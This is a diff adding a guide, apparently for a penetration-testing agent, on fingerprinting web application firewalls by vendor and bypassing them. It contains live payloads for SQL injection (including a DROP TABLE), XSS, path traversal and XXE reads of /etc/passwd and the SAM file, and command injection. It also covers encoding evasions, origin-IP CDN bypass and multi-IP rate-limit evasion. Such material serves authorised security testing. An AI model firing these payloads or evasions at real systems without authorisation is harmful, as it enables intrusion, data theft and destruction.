@@ -1,0 +1,398 @@
+<waf_detector_guide>
+<title>WAF DETECTION AND FINGERPRINTING</title>
+
+<critical>Web Application Firewalls (WAFs) are the first line of defense encountered during penetration testing. Accurate WAF identification is essential for selecting appropriate bypass techniques and avoiding detection. Different WAF vendors have distinct signatures, blocking behaviors, and weaknesses. Fingerprinting the WAF enables targeted evasion strategies.</critical>
+
+<scope>
+- WAF presence detection through behavioral analysis
+- Vendor-specific fingerprinting (Cloudflare, Akamai, AWS WAF, etc.)
+- Blocking behavior analysis and threshold identification
+- Rate limiting discovery and characterization
+- Evasion technique selection based on WAF type
+- Geographic and rule variation detection
+- WAF mode identification (blocking vs monitoring)
+</scope>
+
+<methodology>
+1. Send benign request to establish baseline response.
+2. Send malicious payload to trigger WAF blocking.
+3. Compare responses to detect WAF presence.
+4. Analyze headers and cookies for vendor signatures.
+5. Examine block page content for fingerprints.
+6. Test multiple attack types to map rule coverage.
+7. Probe rate limits and blocking thresholds.
+8. Select appropriate bypass techniques based on findings.
+</methodology>
+
+<waf_signatures>
+<cloudflare>
+{% raw %}
+# Cloudflare WAF Signatures
+
+# Response Headers:
+CF-RAY: 1234567890abcdef-IAD
+CF-Cache-Status: DYNAMIC
+Server: cloudflare
+CF-Request-Id: xxxxx
+
+# Cookies:
+__cfduid=xxxxx
+__cf_bm=xxxxx
+cf_clearance=xxxxx
+
+# Block page indicators:
+"Attention Required!"
+"Cloudflare"
+"Ray ID:"
+"Additional troubleshooting"
+
+# HTTP status on block: 403, 503, 1020
+
+# Challenge pages:
+"Checking your browser"
+"Please wait..."
+JavaScript challenge with cf_chl_*
+{% endraw %}
+</cloudflare>
+
+<akamai>
+{% raw %}
+# Akamai WAF (Kona Site Defender) Signatures
+
+# Response Headers:
+X-Akamai-Transformed: xxxxx
+Akamai-GRN: xxxxx
+X-Akamai-Session-Info: xxxxx
+
+# Block page indicators:
+"Access Denied"
+"Reference #"
+"akamaihd.net"
+akamai_error_page
+
+# Error codes:
+# Reference number format: XX.XXXXXXXX.XXXXXXXXXX
+
+# Bot Manager indicators:
+"ak_bmsc" cookie
+"_abck" cookie
+{% endraw %}
+</akamai>
+
+<aws_waf>
+{% raw %}
+# AWS WAF Signatures
+
+# Response Headers:
+X-Amzn-RequestId: xxxxx
+X-Amz-Cf-Id: xxxxx (with CloudFront)
+X-Cache: Error from cloudfront
+
+# Block page indicators:
+"Request blocked"
+"AWS WAF"
+Amazon error pages
+
+# ALB WAF headers:
+X-Amzn-Trace-Id: xxxxx
+
+# HTTP status on block: 403
+{% endraw %}
+</aws_waf>
+
+<imperva>
+{% raw %}
+# Imperva (Incapsula) WAF Signatures
+
+# Cookies:
+incap_ses_xxx=xxxxx
+visid_incap_xxx=xxxxx
+nlbi_xxx=xxxxx
+
+# Response Headers:
+X-CDN: Incapsula
+X-Iinfo: xxxxx
+
+# Block page indicators:
+"Incapsula incident ID"
+"Request unsuccessful"
+"Access denied"
+"incapsula.com"
+
+# HTTP status on block: 403
+{% endraw %}
+</imperva>
+
+<f5_bigip>
+{% raw %}
+# F5 BIG-IP ASM Signatures
+
+# Cookies:
+TS[a-z0-9]{6}=xxxxx
+BIGipServer[pool_name]=xxxxx
+
+# Block page indicators:
+"The requested URL was rejected"
+"Please consult with your administrator"
+Support ID format
+
+# HTTP status on block: 403, custom
+
+# Session persistence cookies reveal pool names
+{% endraw %}
+</f5_bigip>
+
+<modsecurity>
+{% raw %}
+# ModSecurity WAF Signatures
+
+# Block page indicators:
+"ModSecurity"
+"Action: Access Denied"
+"Request Denied by ModSecurity"
+OWASP Core Rule Set references
+
+# Headers may include:
+X-Mod-Security: xxxxx
+
+# HTTP status on block: 403, 406, 501
+
+# Verbose error messages may reveal rules
+{% endraw %}
+</modsecurity>
+
+<sucuri>
+{% raw %}
+# Sucuri WAF Signatures
+
+# Headers:
+X-Sucuri-ID: xxxxx
+X-Sucuri-Cache: xxxxx
+
+# Block page indicators:
+"Access Denied - Sucuri Website Firewall"
+"Sucuri WebSite Firewall"
+"If you think this is a mistake"
+
+# HTTP status on block: 403
+{% endraw %}
+</sucuri>
+
+<barracuda>
+{% raw %}
+# Barracuda WAF Signatures
+
+# Cookies:
+barra_counter_session=xxxxx
+
+# Block page indicators:
+"Barracuda Networks"
+"You have been blocked"
+"Request blocked"
+
+# HTTP status on block: 403
+{% endraw %}
+</barracuda>
+</waf_signatures>
+
+<detection_techniques>
+<trigger_payloads>
+{% raw %}
+# Payloads to trigger WAF detection
+
+# SQL Injection triggers:
+' OR '1'='1
+1 UNION SELECT NULL--
+'; DROP TABLE users--
+
+# XSS triggers:
+<script>alert(1)</script>
+"><img src=x onerror=alert(1)>
+javascript:alert(1)
+
+# Path traversal triggers:
+../../../../etc/passwd
+..\..\..\..\windows\system32\config\sam
+
+# Command injection triggers:
+; cat /etc/passwd
+| ls -la
+`whoami`
+
+# SSTI triggers:
+{{7*7}}
+${7*7}
+<%= 7*7 %>
+
+# XXE triggers:
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+{% endraw %}
+</trigger_payloads>
+
+<response_analysis>
+{% raw %}
+# Analyzing WAF responses
+
+# Compare baseline vs attack response:
+1. Status code change (200 -> 403)
+2. Response body completely different
+3. New cookies set
+4. New headers added
+5. Response time difference (WAF processing)
+
+# Generic WAF indicators:
+- Immediate 403 on attack payload
+- Custom block page (vs framework default)
+- Challenge pages (JavaScript, CAPTCHA)
+- Rate limiting after multiple attacks
+- IP-based blocking after threshold
+{% endraw %}
+</response_analysis>
+
+<rate_limit_detection>
+{% raw %}
+# Discovering rate limits and thresholds
+
+# Test patterns:
+1. Increase request frequency until blocked
+2. Test from multiple IPs to confirm
+3. Check if rate limits are per-endpoint or global
+4. Identify if limits are per-IP, per-session, or per-user
+
+# Common rate limit responses:
+HTTP 429 Too Many Requests
+"Rate limit exceeded"
+Retry-After header
+X-RateLimit-* headers
+
+# Threshold mapping:
+# - Requests per second
+# - Requests per minute
+# - Attack payloads per hour
+# - Reset window duration
+{% endraw %}
+</rate_limit_detection>
+</detection_techniques>
+
+<evasion_techniques>
+{% raw %}
+# WAF Bypass Techniques by Category
+
+# ENCODING BYPASSES:
+URL encoding: %3Cscript%3E
+Double encoding: %253Cscript%253E
+Unicode: \u003cscript\u003e
+HTML entities: &lt;script&gt;
+Hex encoding: 0x3c7363726970743e
+
+# CASE VARIATION:
+<ScRiPt>alert(1)</sCrIpT>
+SELECT -> SeLeCt
+UNION -> UnIoN
+
+# COMMENT INJECTION:
+<scr<!--comment-->ipt>
+SEL/**/ECT
+UN/**/ION
+
+# WHITESPACE MANIPULATION:
+<script%0a>
+<script%0d>
+<script%09>
+SELECT%20%20%20*
+
+# NULL BYTE:
+<script>%00alert(1)</script>
+SELECT%00*
+
+# PROTOCOL/SCHEME:
+<a href="JaVaScRiPt:alert(1)">
+<a href="data:text/html,<script>alert(1)</script>">
+
+# CHUNKED ENCODING:
+Transfer-Encoding: chunked
+# Split payload across chunks
+
+# HTTP METHOD OVERRIDE:
+X-HTTP-Method-Override: PUT
+X-Method-Override: DELETE
+
+# HEADER INJECTION:
+X-Forwarded-For: 127.0.0.1
+X-Original-URL: /admin
+{% endraw %}
+</evasion_techniques>
+
+<waf_specific_bypasses>
+{% raw %}
+# Vendor-Specific Bypass Techniques
+
+# CLOUDFLARE:
+- Time-based rate limit evasion
+- Origin IP discovery bypasses CDN
+- WebSocket connections less filtered
+- API endpoints may have different rules
+
+# AKAMAI:
+- Bot Manager timing attacks
+- Session token manipulation
+- Geographic rule variations
+- API path differences
+
+# AWS WAF:
+- Rule group identification
+- Managed rule version differences
+- Custom rule enumeration
+- CloudFront caching bypass
+
+# ModSecurity (CRS):
+- Paranoia level detection
+- Rule exclusion enumeration
+- False positive exploitation
+{% endraw %}
+</waf_specific_bypasses>
+
+<validation>
+1. Confirm WAF detection with multiple independent indicators.
+2. Test evasion techniques actually bypass blocking.
+3. Verify vendor identification through unique signatures.
+4. Confirm rate limits through controlled testing.
+5. Test from multiple IPs to distinguish IP-based vs request-based rules.
+6. Check if WAF is in blocking vs detection-only mode.
+7. Validate geographic variations by testing from different regions.
+</validation>
+
+<false_positives>
+- Generic 403 from application, not WAF
+- Rate limiting from application layer, not WAF
+- Load balancer errors mistaken for WAF blocks
+- CDN error pages without actual WAF
+- Application-level input validation vs WAF blocking
+- Network-level blocks (firewall) vs application WAF
+- Cache serving stale block pages
+</false_positives>
+
+<impact>
+- Accurate WAF identification enables targeted bypass research
+- Understanding blocking thresholds prevents detection
+- Rate limit knowledge informs testing speed
+- Vendor identification reveals known bypass techniques
+- Mode detection (block vs monitor) affects testing strategy
+- Geographic variations may provide testing opportunities
+</impact>
+
+<pro_tips>
+1. Always establish baseline before sending attack payloads.
+2. Test from multiple IPs - one may be already blocked.
+3. Check if WAF rules differ between endpoints (/api vs /).
+4. Look for origin IP to bypass CDN-based WAFs.
+5. WebSocket and SSE connections often have different rules.
+6. Mobile app APIs may have relaxed WAF rules.
+7. Test at different times - some WAFs have time-based rules.
+8. Error pages may leak WAF version information.
+9. Rate limit resets often occur on the minute boundary.
+10. Some WAFs only block on POST, not GET with same payload.
+</pro_tips>
+
+<remember>WAF detection is the reconnaissance phase of bypass testing. Accurate fingerprinting dramatically improves bypass success rates. Never assume a single detection method is conclusive - cross-reference headers, cookies, body content, and behavior patterns. The goal is not just detection but understanding the specific implementation to inform bypass strategy.</remember>
+</waf_detector_guide>
